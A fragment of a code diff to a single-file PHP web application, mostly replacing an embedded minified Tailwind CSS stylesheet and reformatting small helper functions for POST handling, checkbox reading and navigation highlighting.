space,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.text-2xl{font-size:1.5rem;line-height:2rem}.text-base{font-size:1rem;line-height:1.5rem}.text-sm{font-size:.875rem;line-height:1.25rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-semibold{font-weight:600}.leading-6{line-height:1.5rem}.leading-7{line-height:1.75rem}.leading-8{line-height:2rem}.leading-9{line-height:2.25rem}.tracking-tight{letter-spacing:-.025em}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128/var(--tw-text-opacity))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81/var(--tw-text-opacity))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39/var(--tw-text-opacity))}.text-indigo-600{--tw-text-opacity:1;color:rgb(79 70 229/var(--tw-text-opacity))}.text-red-500{--tw-text-opacity:1;color:rgb(239 68 68/var(--tw-text-opacity))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}.text-yellow-600{--tw-text-opacity:1;color:rgb(202 138 4/var(--tw-text-opacity))}.text-zinc-400{--tw-text-opacity:1;color:rgb(161 161 170/var(--tw-text-opacity))}.text-zinc-500{--tw-text-opacity:1;color:rgb(113 113 122/var(--tw-text-opacity))}.text-zinc-900{--tw-text-opacity:1;color:rgb(24 24 27/var(--tw-text-opacity))}.placeholder-zinc-400::-moz-placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity))}.placeholder-zinc-400::placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity))}.shadow{--tw-shadow:0 1px 3px 0 #0000001a,0 1px 2px -1px #0000001a;--tw-shadow-colored:0 1px 3px 0 var(--tw-shadow-color),0 1px 2px -1px var(--tw-shadow-color)}.shadow,.shadow-md{box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.shadow-md{--tw-shadow:0 4px 6px -1px #0000001a,0 2px 4px -2px #0000001a;--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color),0 2px 4px -2px var(--tw-shadow-color)}.shadow-sm{--tw-shadow:0 1px 2px 0 #0000000d;--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.ring-1{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.ring-inset{--tw-ring-inset:inset}.ring-black{--tw-ring-opacity:1;--tw-ring-color:rgb(0 0 0/var(--tw-ring-opacity))}.ring-gray-300{--tw-ring-opacity:1;--tw-ring-color:rgb(209 213 219/var(--tw-ring-opacity))}.ring-white\/10{--tw-ring-color:#ffffff1a}.ring-zinc-300{--tw-ring-opacity:1;--tw-ring-color:rgb(212 212 216/var(--tw-ring-opacity))}.ring-opacity-5{--tw-ring-opacity:0.05}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.duration-300{transition-duration:.3s}.hover\:bg-indigo-400:hover{--tw-bg-opacity:1;background-color:rgb(129 140 248/var(--tw-bg-opacity))}.hover\:bg-indigo-500:hover{--tw-bg-opacity:1;background-color:rgb(99 102 241/var(--tw-bg-opacity))}.hover\:bg-zinc-700:hover{--tw-bg-opacity:1;background-color:rgb(63 63 70/var(--tw-bg-opacity))}.hover\:text-indigo-900:hover{--tw-text-opacity:1;color:rgb(49 46 129/var(--tw-text-opacity))}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.focus\:ring-inset:focus{--tw-ring-inset:inset}.focus\:ring-indigo-500:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(99 102 241/var(--tw-ring-opacity))}.focus\:ring-indigo-600:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(79 70 229/var(--tw-ring-opacity))}.focus-visible\:outline:focus-visible{outline-style:solid}.focus-visible\:outline-2:focus-visible{outline-width:2px}.focus-visible\:outline-offset-2:focus-visible{outline-offset:2px}.focus-visible\:outline-indigo-500:focus-visible{outline-color:#6366f1}.focus-visible\:outline-indigo-600:focus-visible{outline-color:#4f46e5}@media (min-width:640px){.sm\:-mx-6{margin-left:-1.5rem;margin-right:-1.5rem}.sm\:mx-auto{margin-left:auto;margin-right:auto}.sm\:ml-16{margin-left:4rem}.sm\:mt-0{margin-top:0}.sm\:flex{display:flex}.sm\:w-full{width:100%}.sm\:max-w-sm{max-width:24rem}.sm\:flex-auto{flex:1 1 auto}.sm\:flex-none{flex:none}.sm\:flex-row{flex-direction:row}.sm\:flex-wrap{flex-wrap:wrap}.sm\:items-center{align-items:center}.sm\:space-x-6>:not([hidden])~:not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.5rem*var(--tw-space-x-reverse));margin-left:calc(1.5rem*(1 - var(--tw-space-x-reverse)))}.sm\:truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.sm\:rounded-lg{border-radius:.5rem}.sm\:px-6{padding-right:1.5rem}.sm\:pl-6,.sm\:px-6{padding-left:1.5rem}.sm\:pr-6{padding-right:1.5rem}.sm\:text-3xl{font-size:1.875rem;line-height:2.25rem}.sm\:text-sm{font-size:.875rem;line-height:1.25rem}.sm\:leading-6{line-height:1.5rem}.sm\:tracking-tight{letter-spacing:-.025em}}@media (min-width:1024px){.lg\:-mx-8{margin-left:-2rem;margin-right:-2rem}.lg\:flex{display:flex}.lg\:items-center{align-items:center}.lg\:justify-between{justify-content:space-between}.lg\:px-8{padding-left:2rem;padding-right:2rem}}
-EOD;
+    $CSS = <<<'EOF'
+/*! tailwindcss v3.4.3 | MIT License | https://tailwindcss.com*/*,:after,:before{box-sizing:border-box;border:0 solid #e5e7eb}:after,:before{--tw-content:""}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:initial}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:initial;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:initial}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0}fieldset,legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{opacity:1;color:#9ca3af}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]{display:none}[multiple],[type=date],[type=datetime-local],[type=email],[type=month],[type=number],[type=password],[type=search],[type=tel],[type=text],[type=time],[type=url],[type=week],input:where(:not([type])),select,textarea{-webkit-appearance:none;-moz-appearance:none;appearance:none;background-color:#fff;border-color:#6b7280;border-width:1px;border-radius:0;padding:.5rem .75rem;font-size:1rem;line-height:1.5rem;--tw-shadow:0 0 #0000}[multiple]:focus,[type=date]:focus,[type=datetime-local]:focus,[type=email]:focus,[type=month]:focus,[type=number]:focus,[type=password]:focus,[type=search]:focus,[type=tel]:focus,[type=text]:focus,[type=time]:focus,[type=url]:focus,[type=week]:focus,input:where(:not([type])):focus,select:focus,textarea:focus{outline:2px solid #0000;outline-offset:2px;--tw-ring-inset:var(--tw-empty,/*!*/ /*!*/);--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow);border-color:#2563eb}input::-moz-placeholder,textarea::-moz-placeholder{color:#6b7280;opacity:1}input::placeholder,textarea::placeholder{color:#6b7280;opacity:1}::-webkit-datetime-edit-fields-wrapper{padding:0}::-webkit-date-and-time-value{min-height:1.5em;text-align:inherit}::-webkit-datetime-edit{display:inline-flex}::-webkit-datetime-edit,::-webkit-datetime-edit-day-field,::-webkit-datetime-edit-hour-field,::-webkit-datetime-edit-meridiem-field,::-webkit-datetime-edit-millisecond-field,::-webkit-datetime-edit-minute-field,::-webkit-datetime-edit-month-field,::-webkit-datetime-edit-second-field,::-webkit-datetime-edit-year-field{padding-top:0;padding-bottom:0}select{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3E%3Cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3E%3C/svg%3E");background-position:right .5rem center;background-repeat:no-repeat;background-size:1.5em 1.5em;padding-right:2.5rem;-webkit-print-color-adjust:exact;print-color-adjust:exact}[multiple],[size]:where(select:not([size="1"])){background-image:none;background-position:0 0;background-repeat:unset;background-size:initial;padding-right:.75rem;-webkit-print-color-adjust:unset;print-color-adjust:unset}[type=checkbox],[type=radio]{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:0;-webkit-print-color-adjust:exact;print-color-adjust:exact;display:inline-block;vertical-align:middle;background-origin:border-box;-webkit-user-select:none;-moz-user-select:none;user-select:none;flex-shrink:0;height:1rem;width:1rem;color:#2563eb;background-color:#fff;border-color:#6b7280;border-width:1px;--tw-shadow:0 0 #0000}[type=checkbox]{border-radius:0}[type=radio]{border-radius:100%}[type=checkbox]:focus,[type=radio]:focus{outline:2px solid #0000;outline-offset:2px;--tw-ring-inset:var(--tw-empty,/*!*/ /*!*/);--tw-ring-offset-width:2px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow)}[type=checkbox]:checked,[type=radio]:checked{border-color:#0000;background-color:currentColor;background-size:100% 100%;background-position:50%;background-repeat:no-repeat}[type=checkbox]:checked{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Cpath d='M12.207 4.793a1 1 0 0 1 0 1.414l-5 5a1 1 0 0 1-1.414 0l-2-2a1 1 0 0 1 1.414-1.414L6.5 9.086l4.293-4.293a1 1 0 0 1 1.414 0z'/%3E%3C/svg%3E")}@media (forced-colors:active) {[type=checkbox]:checked{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=radio]:checked{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='3'/%3E%3C/svg%3E")}@media (forced-colors:active) {[type=radio]:checked{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=checkbox]:checked:focus,[type=checkbox]:checked:hover,[type=checkbox]:indeterminate,[type=radio]:checked:focus,[type=radio]:checked:hover{border-color:#0000;background-color:currentColor}[type=checkbox]:indeterminate{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 16 16'%3E%3Cpath stroke='%23fff' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M4 8h8'/%3E%3C/svg%3E");background-size:100% 100%;background-position:50%;background-repeat:no-repeat}@media (forced-colors:active) {[type=checkbox]:indeterminate{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=checkbox]:indeterminate:focus,[type=checkbox]:indeterminate:hover{border-color:#0000;background-color:currentColor}[type=file]{background:unset;border-color:inherit;border-width:0;border-radius:0;padding:0;font-size:unset;line-height:inherit}[type=file]:focus{outline:1px solid ButtonText;outline:1px auto -webkit-focus-ring-color}::-webkit-scrollbar{width:.5rem}::-webkit-scrollbar-track{border-radius:.5rem;--tw-bg-opacity:1;background-color:rgb(228 228 231/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-track{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity))}}::-webkit-scrollbar-thumb{border-radius:.5rem;--tw-bg-opacity:1;background-color:rgb(161 161 170/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-thumb{--tw-bg-opacity:1;background-color:rgb(63 63 70/var(--tw-bg-opacity))}}::-webkit-scrollbar-thumb:hover{--tw-bg-opacity:1;background-color:rgb(113 113 122/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-thumb:hover{--tw-bg-opacity:1;background-color:rgb(82 82 91/var(--tw-bg-opacity))}}a{text-decoration:none!important}*,::backdrop,:after,:before{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:#3b82f680;--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }.container{width:100%}@media (min-width:640px){.container{max-width:640px}}@media (min-width:768px){.container{max-width:768px}}@media (min-width:1024px){.container{max-width:1024px}}@media (min-width:1280px){.container{max-width:1280px}}@media (min-width:1536px){.container{max-width:1536px}}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border-width:0}.visible{visibility:visible}.fixed{position:fixed}.relative{position:relative}.inset-y-0{top:0;bottom:0}.z-50{z-index:50}.-mx-2{margin-left:-.5rem;margin-right:-.5rem}.-mx-4{margin-left:-1rem;margin-right:-1rem}.-my-2{margin-top:-.5rem;margin-bottom:-.5rem}.mx-1{margin-left:.25rem;margin-right:.25rem}.mb-0{margin-bottom:0}.mb-8{margin-bottom:2rem}.ml-3{margin-left:.75rem}.ml-72{margin-left:18rem}.ml-auto{margin-left:auto}.mr-1{margin-right:.25rem}.mr-1\.5{margin-right:.375rem}.mt-1{margin-top:.25rem}.mt-10{margin-top:2.5rem}.mt-2{margin-top:.5rem}.mt-4{margin-top:1rem}.mt-8{margin-top:2rem}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.table{display:table}.flow-root{display:flow-root}.grid{display:grid}.contents{display:contents}.hidden{display:none}.h-16{height:4rem}.h-4{height:1rem}.h-5{height:1.25rem}.h-6{height:1.5rem}.h-8{height:2rem}.h-full{height:100%}.max-h-96{max-height:24rem}.min-h-full{min-height:100%}.w-4{width:1rem}.w-5{width:1.25rem}.w-6{width:1.5rem}.w-72{width:18rem}.w-8{width:2rem}.w-full{width:100%}.w-1\/3{width:33.333333%}.min-w-0{min-width:0}.min-w-full{min-width:100%}.max-w-full{max-width:100%}.max-w-xl{max-width:36rem}.flex-1{flex:1 1 0%}.flex-shrink-0,.shrink-0{flex-shrink:0}.flex-grow{flex-grow:1}.flex-grow-0{flex-grow:0}.cursor-pointer{cursor:pointer}.select-none{-webkit-user-select:none;-moz-user-select:none;user-select:none}.select-all{-webkit-user-select:all;-moz-user-select:all;user-select:all}.list-inside{list-style-position:inside}.list-disc{list-style-type:disc}.grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.flex-col{flex-direction:column}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-8{gap:2rem}.gap-x-3{-moz-column-gap:.75rem;column-gap:.75rem}.gap-x-4{-moz-column-gap:1rem;column-gap:1rem}.gap-y-2{row-gap:.5rem}.gap-y-5{row-gap:1.25rem}.gap-y-6{row-gap:1.5rem}.gap-y-7{row-gap:1.75rem}.space-y-6>:not([hidden])~:not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1.5rem*(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1.5rem*var(--tw-space-y-reverse))}.divide-y>:not([hidden])~:not([hidden]){--tw-divide-y-reverse:0;border-top-width:calc(1px*(1 - var(--tw-divide-y-reverse)));border-bottom-width:calc(1px*var(--tw-divide-y-reverse))}.divide-gray-200>:not([hidden])~:not([hidden]){--tw-divide-opacity:1;border-color:rgb(229 231 235/var(--tw-divide-opacity))}.divide-gray-300>:not([hidden])~:not([hidden]){--tw-divide-opacity:1;border-color:rgb(209 213 219/var(--tw-divide-opacity))}.overflow-auto{overflow:auto}.overflow-hidden{overflow:hidden}.overflow-x-auto{overflow-x:auto}.overflow-y-auto{overflow-y:auto}.overflow-y-scroll{overflow-y:scroll}.whitespace-nowrap{white-space:nowrap}.rounded{border-radius:.25rem}.rounded-md{border-radius:.375rem}.border-0{border-width:0}.border-b{border-bottom-width:1px}.border-l-4{border-left-width:4px}.border-yellow-500{--tw-border-opacity:1;border-color:rgb(234 179 8/var(--tw-border-opacity))}.border-zinc-300{--tw-border-opacity:1;border-color:rgb(212 212 216/var(--tw-border-opacity))}.border-zinc-700{--tw-border-opacity:1;border-color:rgb(63 63 70/var(--tw-border-opacity))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251/var(--tw-bg-opacity))}.bg-indigo-500{--tw-bg-opacity:1;background-color:rgb(99 102 241/var(--tw-bg-opacity))}.bg-indigo-600{--tw-bg-opacity:1;background-color:rgb(79 70 229/var(--tw-bg-opacity))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity))}.bg-white\/5{background-color:#ffffff0d}.bg-yellow-100{--tw-bg-opacity:1;background-color:rgb(254 249 195/var(--tw-bg-opacity))}.bg-zinc-100{--tw-bg-opacity:1;background-color:rgb(244 244 245/var(--tw-bg-opacity))}.bg-zinc-800{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity))}.bg-zinc-900{--tw-bg-opacity:1;background-color:rgb(24 24 27/var(--tw-bg-opacity))}.p-2{padding:.5rem}.p-4{padding:1rem}.px-16{padding-left:4rem;padding-right:4rem}.px-2{padding-left:.5rem;padding-right:.5rem}.px-3{padding-left:.75rem;padding-right:.75rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.py-1{padding-top:.25rem;padding-bottom:.25rem}.py-1\.5{padding-top:.375rem;padding-bottom:.375rem}.py-10{padding-top:2.5rem;padding-bottom:2.5rem}.py-12{padding-top:3rem;padding-bottom:3rem}.py-2{padding-top:.5rem;padding-bottom:.5rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.py-3\.5{padding-top:.875rem;padding-bottom:.875rem}.py-4{padding-top:1rem}.pb-4,.py-4{padding-bottom:1rem}.pl-3{padding-left:.75rem}.pr-10{padding-right:2.5rem}.pr-4{padding-right:1rem}.text-left{text-align:left}.text-center{text-align:center}.text-right{text-align:right}.align-middle{vertical-align:middle}.font-mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.text-2xl{font-size:1.5rem;line-height:2rem}.text-base{font-size:1rem;line-height:1.5rem}.text-sm{font-size:.875rem;line-height:1.25rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-semibold{font-weight:600}.leading-6{line-height:1.5rem}.leading-7{line-height:1.75rem}.leading-8{line-height:2rem}.leading-9{line-height:2.25rem}.tracking-tight{letter-spacing:-.025em}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128/var(--tw-text-opacity))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81/var(--tw-text-opacity))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39/var(--tw-text-opacity))}.text-indigo-600{--tw-text-opacity:1;color:rgb(79 70 229/var(--tw-text-opacity))}.text-red-500{--tw-text-opacity:1;color:rgb(239 68 68/var(--tw-text-opacity))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}.text-yellow-600{--tw-text-opacity:1;color:rgb(202 138 4/var(--tw-text-opacity))}.text-zinc-400{--tw-text-opacity:1;color:rgb(161 161 170/var(--tw-text-opacity))}.text-zinc-500{--tw-text-opacity:1;color:rgb(113 113 122/var(--tw-text-opacity))}.text-zinc-900{--tw-text-opacity:1;color:rgb(24 24 27/var(--tw-text-opacity))}.text-zinc-800{--tw-text-opacity:1;color:rgb(39 39 42/var(--tw-text-opacity))}.placeholder-zinc-400::-moz-placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity))}.placeholder-zinc-400::placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity))}.shadow{--tw-shadow:0 1px 3px 0 #0000001a,0 1px 2px -1px #0000001a;--tw-shadow-colored:0 1px 3px 0 var(--tw-shadow-color),0 1px 2px -1px var(--tw-shadow-color)}.shadow,.shadow-md{box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.shadow-md{--tw-shadow:0 4px 6px -1px #0000001a,0 2px 4px -2px #0000001a;--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color),0 2px 4px -2px var(--tw-shadow-color)}.shadow-sm{--tw-shadow:0 1px 2px 0 #0000000d;--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.ring-1{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.ring-inset{--tw-ring-inset:inset}.ring-black{--tw-ring-opacity:1;--tw-ring-color:rgb(0 0 0/var(--tw-ring-opacity))}.ring-gray-300{--tw-ring-opacity:1;--tw-ring-color:rgb(209 213 219/var(--tw-ring-opacity))}.ring-white\/10{--tw-ring-color:#ffffff1a}.ring-zinc-300{--tw-ring-opacity:1;--tw-ring-color:rgb(212 212 216/var(--tw-ring-opacity))}.ring-opacity-5{--tw-ring-opacity:0.05}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.duration-300{transition-duration:.3s}.hover\:bg-indigo-400:hover{--tw-bg-opacity:1;background-color:rgb(129 140 248/var(--tw-bg-opacity))}.hover\:bg-indigo-500:hover{--tw-bg-opacity:1;background-color:rgb(99 102 241/var(--tw-bg-opacity))}.hover\:bg-zinc-700:hover{--tw-bg-opacity:1;background-color:rgb(63 63 70/var(--tw-bg-opacity))}.hover\:text-indigo-900:hover{--tw-text-opacity:1;color:rgb(49 46 129/var(--tw-text-opacity))}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.focus\:ring-inset:focus{--tw-ring-inset:inset}.focus\:ring-indigo-500:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(99 102 241/var(--tw-ring-opacity))}.focus\:ring-indigo-600:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(79 70 229/var(--tw-ring-opacity))}.focus-visible\:outline:focus-visible{outline-style:solid}.focus-visible\:outline-2:focus-visible{outline-width:2px}.focus-visible\:outline-offset-2:focus-visible{outline-offset:2px}.focus-visible\:outline-indigo-500:focus-visible{outline-color:#6366f1}.focus-visible\:outline-indigo-600:focus-visible{outline-color:#4f46e5}@media (min-width:640px){.sm\:-mx-6{margin-left:-1.5rem;margin-right:-1.5rem}.sm\:mx-auto{margin-left:auto;margin-right:auto}.sm\:ml-16{margin-left:4rem}.sm\:mt-0{margin-top:0}.sm\:flex{display:flex}.sm\:w-full{width:100%}.sm\:max-w-sm{max-width:24rem}.sm\:flex-auto{flex:1 1 auto}.sm\:flex-none{flex:none}.sm\:flex-row{flex-direction:row}.sm\:flex-wrap{flex-wrap:wrap}.sm\:items-center{align-items:center}.sm\:space-x-6>:not([hidden])~:not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.5rem*var(--tw-space-x-reverse));margin-left:calc(1.5rem*(1 - var(--tw-space-x-reverse)))}.sm\:truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.sm\:rounded-lg{border-radius:.5rem}.sm\:px-6{padding-left:1.5rem}.sm\:pr-6,.sm\:px-6{padding-right:1.5rem}.sm\:text-3xl{font-size:1.875rem;line-height:2.25rem}.sm\:text-sm{font-size:.875rem;line-height:1.25rem}.sm\:leading-6{line-height:1.5rem}.sm\:tracking-tight{letter-spacing:-.025em}}@media (min-width:1024px){.lg\:-mx-8{margin-left:-2rem;margin-right:-2rem}.lg\:flex{display:flex}.lg\:items-center{align-items:center}.lg\:justify-between{justify-content:space-between}.lg\:px-8{padding-left:2rem;padding-right:2rem}}
+EOF;
 
-////////////////////////
-/// UTILITY FUNCTIONS //
-////////////////////////
+    ////////////////////////
+    /// UTILITY FUNCTIONS //
+    ////////////////////////
 
-// Fix for PHP < 5.5
-    if (!function_exists("array_column")) {
-        function array_column($array, $column_name)
-        {
-            return array_map(function ($element) use ($column_name) {
-                return $element[$column_name];
-            }, $array);
-        }
+    /**
+     * Array column function for PHP < 5.5
+     *
+     * @param $array array Array to extract the column from
+     * @param $column_name string Column name to extract
+     *
+     * @return array Extracted column
+     */
+    function _array_column($array, $column_name) {
+        return array_map(function ($element) use ($column_name) { return $element[$column_name]; }, $array);
     }
 
     /**
@@ -145,8 +203,7 @@ EOD;
      *
      * @return bool
      */
-    function isPost()
-    {
+    function isPost() {
         return $_SERVER['REQUEST_METHOD'] === 'POST';
     }
 
@@ -157,14 +214,13 @@ EOD;
      *
      * @return bool
      */
-    function isCheckboxActive($name)
-    {
+    function isCheckboxActive($name) {
         return isset($_POST[$name]) && $_POST[$name] === "y";
     }
 
-///////////////////////
-/// RENDERING BLOCK ///
-///////////////////////
+    ///////////////////////
+    /// RENDERING BLOCK ///
+    ///////////////////////
 
     /**
      * Returns the classes to apply to the navigation item highlighted because it's the current page
@@ -174,8 +230,7 @@ EOD;
      *
      * @return string
      */
-    function htmlHighlightActivePage($current_page, $checking_page)
-    {
+    function htmlHighlightActivePage($current_page, $checking_page) {
         if ($current_page === $checking_page) {
             return "bg-zinc-800 text-white";
